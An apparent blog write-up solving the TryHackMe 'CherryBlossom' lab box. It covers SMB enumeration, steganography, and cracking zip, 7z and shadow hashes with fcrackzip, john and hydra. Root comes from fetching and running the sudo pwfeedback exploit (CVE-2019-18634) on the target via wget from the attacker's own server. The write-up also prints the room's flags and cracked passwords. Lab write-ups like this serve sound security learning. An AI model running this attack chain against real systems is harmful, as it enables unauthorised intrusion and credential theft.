---
title: TryHackMe - CherryBlossom Writeup
description: My writeup on CherryBlossom box.
categories:
 - tryhackme
tags: tryhackme
---

Hi all, i have to admit this machine broke my nerves haha, wasnt too hard just too many steps anyway let's pwn it!

You can find the machine there > [CherryBlossom](https://tryhackme.com/room/cherryblossom){:target="_blank"}

As always let's start with a nmap scan.

```bash
$ ip=10.10.37.166
$ nmap -sC -sV -oN nmap.txt $ip
Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-14 13:40 EEST
Nmap scan report for 10.10.37.166 (10.10.37.166)
Host is up (0.099s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 21:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3 (RSA)
|   256 dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4 (ECDSA)
|_  256 12:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

No `http` weird, of course will start by enumerating SMB service. I always start with checking the shares with `smbmap`.

```bash
$ smbmap -H $ip
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.37.166...
[+] IP: 10.10.37.166:445	Name: 10.10.37.166                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	Anonymous                                         	READ ONLY
	IPC$                                              	NO ACCESS
```

We have `READ ONLY` access to `Anonymous` share bingo! 

I always use `smbclient` to access the shares.

```bash
$ smbclient //$ip/Anonymous
Unable to initialize messaging context
Enter WORKGROUP\atom's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```

Perfect, there is a file there, let's download it.

```bash
smb: \> ls
  .                                   D        0  Mon Feb 10 02:22:51 2020
  ..                                  D        0  Sun Feb  9 19:48:18 2020
  journal.txt                         N  3470998  Mon Feb 10 02:20:53 2020

		10253588 blocks of size 1024. 4680584 blocks available
smb: \> get journal.txt
getting file \journal.txt of size 3470998 as journal.txt (505.4 KiloBytes/sec) (average 505.4 KiloBytes/sec)
smb: \> 
```

File has `base64` in let's decode it.

```bash
$ file journal.txt 
journal.txt: ASCII text
$ base64 -d journal.txt > journal_clear.txt
$ file journal_clear.txt 
journal_clear.txt: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
```

Hmm a `.png` image, probably needs stego because `Question Hint` on TryHackMe gives us a stego toolkit.

After some tries i found the right tool > [stegpy](https://github.com/dhsdshdhk/stegpy){:target="_blank"}

```bash
$ stegpy journal_clear.txt 
File _journal.zip succesfully extracted from journal_clear.txt
$ file _journal.zip 
_journal.zip: JPEG image data
```

`.zip` `.jpeg` !? probably file is broken we need to fix that.

Let's check the magic bytes first.

```bash
$ xxd -p _journal.zip | head -1
ffd8ffd814000900080035004a50847d980b3d130100221301000b001c00
```

Magic bytes for `jpeg` -> `FF D8 FF E0 00 10 4A 46 49 46 00 01`

Let's edit this and add `zip` ones -> `50 4B 03 04`

I always use `hexedit` for that. After fix :

```bash
$ xxd -p _journal.zip | head -1
504b030414000900080035004a50847d980b3d130100221301000b001c00
$ file _journal.zip 
_journal.zip: Zip archive data, at least v2.0 to extract
```

But `zip` is password protected!

```bash
$ unzip _journal.zip 
Archive:  _journal.zip
[_journal.zip] Journal.ctz password: 
```

Let's crack it with `fcrackzip`.

```bash
$ fcrackzip -u -D -p rockyou.txt _journal.zip 
PASSWORD FOUND!!!!: pw == september
$ unzip -P september _journal.zip 
Archive:  _journal.zip
  inflating: Journal.ctz             
$ file Journal.ctz 
Journal.ctz: 7-zip archive data, version 0.4
```

So `.ctz` is a cherrytree file! Let's crack it, i'll use my old friend john! :P

```bash
$ locate 7z2john
/usr/share/john/7z2john.pl
$ sudo /usr/share/john/7z2john.pl Journal.ctz > ctzhash
$ sudo john --wordlist=rockyou.txt ctzhash
Press 'q' or Ctrl-C to abort, almost any other key for status
tigerlily        (Journal.ctz)
Session completed
```

Let's open it with cherrytree now.

![](https://i.imgur.com/b59wTTj.png)

![](https://i.imgur.com/KgcUsxn.png)

Let's download this wordlist!

Also we can see a username there!

![](https://i.imgur.com/Fp1VBi9.png)

We can use this combo now for a brute force attack on `SSH`!

```bash
$ hydra -l lily -P wordlist.txt $ip ssh
[22][ssh] host: 10.10.143.72   login: lily   password: Mr.$un$hin3
```

```bash
$ ssh lily@$ip
lily@10.10.143.72's password: 

	#####################################
	##########  Welcome, Lily  ##########
        #####################################

lily@cherryblossom:~$ whoami
lily
```

Finally shell! :D

After some manual enumeration, i found under `/var/backups` a readable `shadow.bak` file, let's try to crack `johan` password!

```bash
$ sudo john --wordlist=wordlist.txt johanhash
Press 'q' or Ctrl-C to abort, almost any other key for status
##scuffleboo##   (johan)
```

```bash
$ su - johan
Password: 
johan@cherryblossom:~$ whoami
johan
```

I did lot of enumeration but i found nothing, so i fired up [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester){:target="_blank"}!

```bash
johan@cherryblossom:~$ bash linux-exploit-suggester.sh 
Possible Exploits:

[+] [CVE-2019-7304] dirty_sock

   Details: https://initblog.com/2019/dirty-sock/
   Exposure: less probable
   Tags: ubuntu=18.10,mint=19
   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
   Comments: Distros use own versioning scheme. Manual verification needed.

[+] [CVE-2019-18634] sudo pwfeedback <---
```

`sudo pwfeedback` seems good, let's give it a go!

First let's download the exploit on our machine and compile it!

```bash
$ wget -q https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
$ gcc exploit.c -o exploit
$ sudo python3 -m http.server 80
```

Now let's download it on target box and execute it!

```bash
johan@cherryblossom:~$ wget -q my_tun0_ip/exploit
johan@cherryblossom:~$ chmod +x exploit
johan@cherryblossom:~$ ./exploit 
[sudo] password for johan: 
Sorry, try again.
# whoami
root
# 
```

Bingoo! Let's grab the flags.

```bash
# cat /root/root.txt && cat /home/johan/user.txt
THM{d4b5e228a567288d12e301f2f0bf5be0}
THM{cb064113d54e24dc84f26b1f63bf3098}
```

Was fun, see you!
